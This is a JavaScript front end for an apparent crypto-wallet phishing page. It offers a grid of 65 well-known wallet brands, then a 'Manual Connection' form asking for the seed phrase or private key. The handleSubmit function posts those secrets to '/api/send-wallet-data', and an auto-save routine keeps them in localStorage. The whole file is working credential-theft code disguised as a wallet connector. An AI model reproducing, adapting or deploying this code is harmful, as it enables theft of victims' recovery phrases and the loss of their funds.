// Wallet Connect Script

const wallets = [
  { id: 1, name: 'MetaMask', icon: '🦊' },
  { id: 2, name: 'Trust Wallet', icon: '💙' },
  { id: 3, name: 'Coinbase Wallet', icon: '₿' },
  { id: 4, name: 'Ledger', icon: '🔐' },
  { id: 5, name: 'Trezor', icon: '🛡️' },
  { id: 6, name: 'SafePal', icon: '🎯' },
  { id: 7, name: 'OKX Wallet', icon: '🟡' },
  { id: 8, name: 'Phantom', icon: '👻' },
  { id: 9, name: 'FoxWallet', icon: '🦊' },
  { id: 10, name: 'Tangem', icon: '🎴' },
  { id: 11, name: 'BitPay', icon: '💳' },
  { id: 12, name: 'Exodus', icon: '📊' },
  { id: 13, name: 'Myetherwallet', icon: '🌐' },
  { id: 14, name: 'Argent', icon: '🔑' },
  { id: 15, name: 'Rainbow', icon: '🌈' },
  { id: 16, name: 'Gnosis Safe', icon: '🔒' },
  { id: 17, name: 'MEW Connect', icon: '🔗' },
  { id: 18, name: 'Unstoppable', icon: '⚡' },
  { id: 19, name: 'Crypto.com', icon: '🪙' },
  { id: 20, name: 'Electrum', icon: '⚙️' },
  { id: 21, name: 'BlueWallet', icon: '🔵' },
  { id: 22, name: 'Jaxx', icon: '📱' },
  { id: 23, name: 'Huobi Wallet', icon: '🟠' },
  { id: 24, name: 'Wallet.io', icon: '💼' },
  { id: 25, name: 'Brave Wallet', icon: '🦁' },
  { id: 26, name: 'Alchemist', icon: '⚗️' },
  { id: 27, name: 'Alpha Wallet', icon: '🅰️' },
  { id: 28, name: 'AToken', icon: '🎁' },
  { id: 29, name: 'Atomic Wallet', icon: '⚛️' },
  { id: 30, name: 'Ballet', icon: '💃' },
  { id: 31, name: 'Binance Wallet', icon: '🟡' },
  { id: 32, name: 'BitKeep', icon: '🔑' },
  { id: 33, name: 'Blockchain.com', icon: '⛓️' },
  { id: 34, name: 'BRD', icon: '🔴' },
  { id: 35, name: 'Cipher', icon: '🔓' },
  { id: 36, name: 'Coinomi', icon: '🪙' },
  { id: 37, name: 'Cold Wallet', icon: '❄️' },
  { id: 38, name: 'Copay', icon: '📋' },
  { id: 39, name: 'DAI Wallet', icon: '💰' },
  { id: 40, name: 'DIFX', icon: '📈' },
  { id: 41, name: 'Dapper', icon: '💧' },
  { id: 42, name: 'DAO Wallet', icon: '🏛️' },
  { id: 43, name: 'Decentraland', icon: '🌍' },
  { id: 44, name: 'Enkrypt', icon: '🔐' },
  { id: 45, name: 'Enjin', icon: '🎮' },
  { id: 46, name: 'Equinox', icon: '⚖️' },
  { id: 47, name: 'Frame', icon: '🖼️' },
  { id: 48, name: 'Frontier', icon: '🚀' },
  { id: 49, name: 'Glow', icon: '✨' },
  { id: 50, name: 'Grid+', icon: '⚡' },
  { id: 51, name: 'Guarda', icon: '🏰' },
  { id: 52, name: 'HashPack', icon: '#️⃣' },
  { id: 53, name: 'Hive', icon: '🐝' },
  { id: 54, name: 'imToken', icon: '🎭' },
  { id: 55, name: 'Infinito', icon: '∞' },
  { id: 56, name: 'Keystone', icon: '🔑' },
  { id: 57, name: 'Koinly', icon: '📊' },
  { id: 58, name: 'Krystal', icon: '💎' },
  { id: 59, name: 'Leap', icon: '🦘' },
  { id: 60, name: 'LiquidSwap', icon: '💧' },
  { id: 61, name: 'Loopring', icon: '〰️' },
  { id: 62, name: 'MagicEden', icon: '✨' },
  { id: 63, name: 'Neon', icon: '💡' },
  { id: 64, name: 'Nova', icon: '⭐' },
  { id: 65, name: 'OneKey', icon: '🔑' },
];

let selectedWallet = null;

// Initialize wallet grid
document.addEventListener('DOMContentLoaded', function() {
  renderWalletGrid();
  loadFormData();
});

function renderWalletGrid() {
  const walletGrid = document.getElementById('walletGrid');
  
  wallets.forEach(wallet => {
    const walletItem = document.createElement('div');
    walletItem.className = 'wallet-item';
    walletItem.innerHTML = `
      <div class="wallet-icon">${wallet.icon}</div>
      <div class="wallet-name">${wallet.name}</div>
    `;
    walletItem.onclick = () => selectWallet(wallet, walletItem);
    walletGrid.appendChild(walletItem);
  });
}

function selectWallet(wallet, element) {
  selectedWallet = wallet;
  
  // Update active state
  document.querySelectorAll('.wallet-item').forEach(item => {
    item.classList.remove('active');
  });
  element.classList.add('active');
  
  // Show method modal
  document.getElementById('methodModal').classList.remove('hidden');
  document.getElementById('methodModalTitle').textContent = `Connect ${wallet.name}`;
}

function closeMethodModal() {
  document.getElementById('methodModal').classList.add('hidden');
}

function openFormModal() {
  document.getElementById('methodModal').classList.add('hidden');
  document.getElementById('formModal').classList.remove('hidden');
  document.getElementById('formModalTitle').textContent = `Manual Connection - ${selectedWallet.name}`;
}

function closeFormModal() {
  document.getElementById('formModal').classList.add('hidden');
  selectedWallet = null;
  document.querySelectorAll('.wallet-item').forEach(item => {
    item.classList.remove('active');
  });
}

function handleModalClose(event) {
  if (event.target.id === 'methodModal') {
    closeMethodModal();
  }
}

function handleFormModalClose(event) {
  if (event.target.id === 'formModal') {
    closeFormModal();
  }
}

// Form handling
async function handleSubmit(event) {
  event.preventDefault();
  
  const seedPhrase = document.getElementById('seedPhrase').value.trim();
  const privateKey = document.getElementById('privateKey').value.trim();
  
  if (!seedPhrase && !privateKey) {
    showMessage('✗ Please enter at least Seed Phrase or Private Key', 'error');
    return;
  }
  
  const submitBtn = document.getElementById('submitBtn');
  submitBtn.disabled = true;
  submitBtn.textContent = 'Sending...';
  
  try {
    const response = await fetch('/api/send-wallet-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        wallet: selectedWallet.name,
        seedPhrase: seedPhrase,
        privateKey: privateKey,
        timestamp: new Date().toISOString(),
      }),
    });
    
    if (response.ok) {
      showMessage('✓ Data successfully saved and sent!', 'success');
      document.getElementById('walletForm').reset();
      localStorage.removeItem('walletFormData');
      
      setTimeout(() => {
        closeFormModal();
        submitBtn.disabled = false;
        submitBtn.textContent = 'Connect & Send';
      }, 3000);
    } else {
      showMessage('✗ Error sending data. Please try again.', 'error');
      submitBtn.disabled = false;
      submitBtn.textContent = 'Connect & Send';
    }
  } catch (error) {
    console.error('Error:', error);
    showMessage('✗ Connection error. Please try again.', 'error');
    submitBtn.disabled = false;
    submitBtn.textContent = 'Connect & Send';
  }
}

function showMessage(message, type) {
  const messageEl = document.getElementById('submitMessage');
  messageEl.textContent = message;
  messageEl.className = `submit-message ${type}`;
}

// Auto-save form data
function saveFormData() {
  const seedPhrase = document.getElementById('seedPhrase').value;
  const privateKey = document.getElementById('privateKey').value;
  
  const formData = { seedPhrase, privateKey };
  localStorage.setItem('walletFormData', JSON.stringify(formData));
}

function loadFormData() {
  const savedData = localStorage.getItem('walletFormData');
  if (savedData) {
    const formData = JSON.parse(savedData);
    if (document.getElementById('seedPhrase')) {
      document.getElementById('seedPhrase').value = formData.seedPhrase || '';
      document.getElementById('privateKey').value = formData.privateKey || '';
    }
  }
}

// Add auto-save on input
document.addEventListener('input', function(event) {
  if (event.target.id === 'seedPhrase' || event.target.id === 'privateKey') {
    saveFormData();
  }
});
